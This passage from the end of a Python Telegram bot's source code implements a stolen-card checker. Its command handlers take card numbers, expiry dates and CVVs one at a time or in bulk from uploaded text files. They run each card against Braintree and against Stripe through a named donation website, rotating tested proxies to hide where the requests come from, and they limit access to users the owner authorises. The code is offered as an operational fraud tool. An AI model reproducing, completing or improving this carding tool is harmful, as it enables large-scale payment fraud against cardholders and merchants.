                    msg += f"\n... and {len(working)-15} more"
                await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text("❌ No proxies work with Stripe API.", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text("🛑 Proxy test stopped.", parse_mode=ParseMode.HTML)

# =============================== TELEGRAM HANDLERS ===============================
async def start(update: Update, context):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    await update.message.reply_text(
        "<b>🔥 Braintree + Stripe Payment Checker (2099) – Authorized Only</b>\n\n"
        "📌 <b>Braintree Commands:</b>\n"
        "   <code>/br CC|MM|YY|CVV</code> – single card\n"
        "   Reply to a card file with <code>/brf</code>\n"
        "   Proxy: <code>/tp PROXY</code> , <code>/tpf</code> (reply to file)\n\n"
        "📌 <b>Stripe Commands (ccfoundationorg.com):</b>\n"
        "   <code>/st CC|MM|YY|CVV</code> – single card\n"
        "   Reply to a card file with <code>/stf</code>\n"
        "   Proxy: <code>/tps PROXY</code> , <code>/tpsf</code> (reply to file)\n\n"
        "📌 <b>Proxy Lists & Clear:</b>\n"
        "   <code>/pl</code> – show Braintree proxies\n"
        "   <code>/spl</code> – show Stripe proxies\n"
        "   <code>/cp</code> – clear Braintree proxies\n"
        "   <code>/csp</code> – clear Stripe proxies\n\n"
        "📌 <b>Stop current task (file scan or proxy test):</b> <code>/stop</code>\n\n"
        "🔐 <b>Owner commands:</b>\n"
        "   <code>/add &lt;user_id&gt;</code> – add user\n"
        "   <code>/rem &lt;user_id&gt;</code> – remove user\n"
        "   <code>/al</code> – list authorized users\n\n"
        "⚡ BrightData proxy is fallback only for Braintree.\n"
        "⚡ Stripe uses only proxies that pass <code>/tpsf</code>.\n"
        "⚡ All commands run concurrently – use /stop to stop any ongoing scan.",
        parse_mode=ParseMode.HTML
    )

async def stop_scan(update: Update, context):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    user_stop_flags[user_id] = True
    task = active_tasks.get(user_id)
    if task and not task.done():
        task.cancel()
        await update.message.reply_text("🛑 Stop signal sent to your active task.", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("ℹ️ Stop flag set (no active task found).", parse_mode=ParseMode.HTML)

# Auth management
async def adduser(update: Update, context):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Only owner.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /add USER_ID")
        return
    try:
        new_id = int(context.args[0])
        authorized_users.add(new_id)
        save_authorized_users(authorized_users)
        await update.message.reply_text(f"✅ User {new_id} added.")
    except ValueError:
        await update.message.reply_text("❌ Invalid ID.")

async def removeuser(update: Update, context):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Only owner.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /rem USER_ID")
        return
    try:
        rem_id = int(context.args[0])
        if rem_id == OWNER_ID:
            await update.message.reply_text("❌ Cannot remove owner.")
            return
        if rem_id in authorized_users:
            authorized_users.remove(rem_id)
            save_authorized_users(authorized_users)
            await update.message.reply_text(f"✅ User {rem_id} removed.")
        else:
            await update.message.reply_text("⚠️ User not in list.")
    except ValueError:
        await update.message.reply_text("❌ Invalid ID.")

async def auth_list(update: Update, context):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Only owner.")
        return
    if not authorized_users:
        await update.message.reply_text("No authorized users.")
        return
    msg = "<b>Authorized Users:</b>\n"
    for uid in sorted(authorized_users):
        msg += f"• <code>{uid}</code>\n"
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

# Braintree single
async def br(update, context):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /br CC|MM|YY|CVV")
        return
    card_line = " ".join(context.args)
    if "|" not in card_line or len(card_line.split("|")) < 4:
        await update.message.reply_text("❌ Invalid format.")
        return
    
    if not working_proxies:
        working_proxies.append({"proxy": BRIGHTDATA_PROXY, "speed": 0.5, "label": "🚀"})
    account = random.choice(ACCOUNTS_LIST)
    proxy_info = random.choice(working_proxies)
    proxy = proxy_info['proxy']
    msg = await update.message.reply_text("🔍 Checking via Braintree...", parse_mode=ParseMode.HTML)
    try:
        status, reason, elapsed = await BraintreeGateway.code(card_line, proxy, account)
        result = format_card_response_html(card_line, status, reason, elapsed, update.effective_user, "Braintree")
        await msg.edit_text(result, parse_mode=ParseMode.HTML)
    except Exception as e:
        await msg.edit_text(f"❌ Error: {html.escape(str(e))}", parse_mode=ParseMode.HTML)

# Braintree file
async def brf(update: Update, context):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("❌ Reply to a .txt card file with /brf")
        return
    doc = update.message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Only .txt files.")
        return
    
    if not working_proxies:
        working_proxies.append({"proxy": BRIGHTDATA_PROXY, "speed": 0.5, "label": "🚀"})
    if not ACCOUNTS_LIST:
        await update.message.reply_text("❌ No accounts configured.")
        return
    
    # Cancel previous task for this user
    old = active_tasks.get(user_id)
    if old and not old.done():
        old.cancel()
        await asyncio.sleep(0.5)
    
    user_stop_flags[user_id] = False
    file_obj = await doc.get_file()
    file_bytes = await file_obj.download_as_bytearray()
    task = asyncio.create_task(run_braintree_file_scan(update, context, file_bytes))
    active_tasks[user_id] = task
    try:
        await task
    except asyncio.CancelledError:
        pass
    finally:
        active_tasks.pop(user_id, None)
        user_stop_flags.pop(user_id, None)

# Stripe single
async def st(update, context):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /st CC|MM|YY|CVV")
        return
    card_line = " ".join(context.args)
    if "|" not in card_line or len(card_line.split("|")) < 4:
        await update.message.reply_text("❌ Invalid format.")
        return
    
    if not stripe_proxies:
        await update.message.reply_text("⚠️ No Stripe proxies. Use /tpsf first.")
        return
    proxy_info = random.choice(stripe_proxies)
    proxy = proxy_info['proxy']
    msg = await update.message.reply_text("🔍 Checking via Stripe...", parse_mode=ParseMode.HTML)
    try:
        status, reason, elapsed = await StripeGateway.check_card(card_line, proxy)
        result = format_card_response_html(card_line, status, reason, elapsed, update.effective_user, "Stripe")
        await msg.edit_text(result, parse_mode=ParseMode.HTML)
    except Exception as e:
        await msg.edit_text(f"❌ Error: {html.escape(str(e))}", parse_mode=ParseMode.HTML)

# Stripe file
async def stf(update: Update, context):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("❌ Reply to a .txt card file with /stf")
        return
    doc = update.message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Only .txt files.")
        return
    
    if not stripe_proxies:
        await update.message.reply_text("⚠️ No Stripe proxies. Use /tpsf first.")
        return
    
    old = active_tasks.get(user_id)
    if old and not old.done():
        old.cancel()
        await asyncio.sleep(0.5)
    
    user_stop_flags[user_id] = False
    file_obj = await doc.get_file()
    file_bytes = await file_obj.download_as_bytearray()
    task = asyncio.create_task(run_stripe_file_scan(update, context, file_bytes))
    active_tasks[user_id] = task
    try:
        await task
    except asyncio.CancelledError:
        pass
    finally:
        active_tasks.pop(user_id, None)
        user_stop_flags.pop(user_id, None)

# Proxy commands (short)
async def tp(update, context):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /tp http://user:pass@ip:port")
        return
    proxy = " ".join(context.args)
    msg = await update.message.reply_text(f"🔍 Testing <code>{html.escape(proxy)}</code> on Braintree...", parse_mode=ParseMode.HTML)
    ok, speed, err = await test_single_proxy_braintree(proxy)
    if ok:
        label = "🚀 fast" if speed < 1 else "⚡ medium" if speed < 3 else "🐢 slow"
        await msg.edit_text(f"✅ <b>Proxy works (Braintree)</b>\n<code>{html.escape(proxy)}</code>\n⏱️ Speed: {speed:.2f}s ({label})", parse_mode=ParseMode.HTML)
        if not any(p['proxy'] == proxy for p in working_proxies):
            working_proxies.append({"proxy": proxy, "speed": speed, "label": label[0]})
    else:
        await msg.edit_text(f"❌ <b>Proxy failed (Braintree)</b>\n<code>{html.escape(proxy)}</code>\nError: {html.escape(err)}", parse_mode=ParseMode.HTML)

async def tpf(update, context):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("❌ Reply to a .txt proxy file with /tpf")
        return
    doc = update.message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Only .txt files.")
        return
    
    old = active_tasks.get(user_id)
    if old and not old.done():
        old.cancel()
        await asyncio.sleep(0.5)
    
    user_stop_flags[user_id] = False
    file_obj = await doc.get_file()
    file_bytes = await file_obj.download_as_bytearray()
    task = asyncio.create_task(run_proxy_test_task(update, context, file_bytes, "braintree"))
    active_tasks[user_id] = task
    try:
        await task
    except asyncio.CancelledError:
        pass
    finally:
        active_tasks.pop(user_id, None)
        user_stop_flags.pop(user_id, None)

async def tps(update, context):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /tps http://user:pass@ip:port")
        return
    proxy = " ".join(context.args)
    msg = await update.message.reply_text(f"🔍 Testing <code>{html.escape(proxy)}</code> on Stripe API...", parse_mode=ParseMode.HTML)
    ok, speed, err = await test_proxy_on_stripe(proxy)
    if ok:
        label = "🚀 fast" if speed < 1 else "⚡ medium" if speed < 3 else "🐢 slow"
        await msg.edit_text(f"✅ <b>Proxy works with Stripe API</b>\n<code>{html.escape(proxy)}</code>\n⏱️ Speed: {speed:.2f}s ({label})", parse_mode=ParseMode.HTML)
        if not any(p['proxy'] == proxy for p in stripe_proxies):
            stripe_proxies.append({"proxy": proxy, "speed": speed, "label": label[0]})
    else:
        await msg.edit_text(f"❌ <b>Proxy failed on Stripe API</b>\n<code>{html.escape(proxy)}</code>\nError: {html.escape(err)}", parse_mode=ParseMode.HTML)

async def tpsf(update, context):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("❌ Reply to a .txt proxy file with /tpsf")
        return
    doc = update.message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Only .txt files.")
        return
    
    old = active_tasks.get(user_id)
    if old and not old.done():
        old.cancel()
        await asyncio.sleep(0.5)
    
    user_stop_flags[user_id] = False
    file_obj = await doc.get_file()
    file_bytes = await file_obj.download_as_bytearray()
    task = asyncio.create_task(run_proxy_test_task(update, context, file_bytes, "stripe"))
    active_tasks[user_id] = task
    try:
        await task
    except asyncio.CancelledError:
        pass
    finally:
        active_tasks.pop(user_id, None)
        user_stop_flags.pop(user_id, None)

# List and clear
async def pl(update, context):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not working_proxies:
        await update.message.reply_text("No Braintree proxies.")
        return
    msg = "📡 <b>Braintree Proxies:</b>\n"
    for i, p in enumerate(working_proxies[:20], 1):
        msg += f"{i}. {p['label']} <code>{html.escape(p['proxy'])}</code> – {p['speed']:.2f}s\n"
    if len(working_proxies) > 20:
        msg += f"\n... and {len(working_proxies)-20} more"
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

async def spl(update, context):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not stripe_proxies:
        await update.message.reply_text("No Stripe proxies.")
        return
    msg = "📡 <b>Stripe Proxies:</b>\n"
    for i, p in enumerate(stripe_proxies[:20], 1):
        msg += f"{i}. {p['label']} <code>{html.escape(p['proxy'])}</code> – {p['speed']:.2f}s\n"
    if len(stripe_proxies) > 20:
        msg += f"\n... and {len(stripe_proxies)-20} more"
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

async def cp(update, context):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    global working_proxies
    working_proxies = []
    await update.message.reply_text("✅ All Braintree proxies cleared.")

async def csp(update, context):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    global stripe_proxies
    stripe_proxies = []
    await update.message.reply_text("✅ All Stripe proxies cleared.")

# Default message handler (Braintree single)
async def handle_message(update, context):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    text = update.message.text.strip()
    if not text.startswith('/') and '|' in text and len(text.split('|')) >= 4:
        if not working_proxies:
            working_proxies.append({"proxy": BRIGHTDATA_PROXY, "speed": 0.5, "label": "🚀"})
        account = random.choice(ACCOUNTS_LIST)
        proxy_info = random.choice(working_proxies)
        proxy = proxy_info['proxy']
        msg = await update.message.reply_text("🔍 Checking via Braintree...", parse_mode=ParseMode.HTML)
        try:
            status, reason, elapsed = await BraintreeGateway.code(text, proxy, account)
            result = format_card_response_html(text, status, reason, elapsed, update.effective_user, "Braintree")
            await msg.edit_text(result, parse_mode=ParseMode.HTML)
        except Exception as e:
            await msg.edit_text(f"❌ Error: {html.escape(str(e))}", parse_mode=ParseMode.HTML)

# =============================== MAIN ===============================
def main():
    if not working_proxies:
        working_proxies.append({"proxy": BRIGHTDATA_PROXY, "speed": 0.5, "label": "🚀"})
    
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_scan))
    app.add_handler(CommandHandler("add", adduser))
    app.add_handler(CommandHandler("rem", removeuser))
    app.add_handler(CommandHandler("al", auth_list))
    app.add_handler(CommandHandler("br", br))
    app.add_handler(CommandHandler("brf", brf))
    app.add_handler(CommandHandler("st", st))
    app.add_handler(CommandHandler("stf", stf))
    app.add_handler(CommandHandler("tp", tp))
    app.add_handler(CommandHandler("tpf", tpf))
    app.add_handler(CommandHandler("tps", tps))
    app.add_handler(CommandHandler("tpsf", tpsf))
    app.add_handler(CommandHandler("pl", pl))
    app.add_handler(CommandHandler("spl", spl))
    app.add_handler(CommandHandler("cp", cp))
    app.add_handler(CommandHandler("csp", csp))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🔥 Bot running with reliable stop, concurrency, and HTML escaping. Use /start")
    app.run_polling()

if __name__ == "__main__":
    main()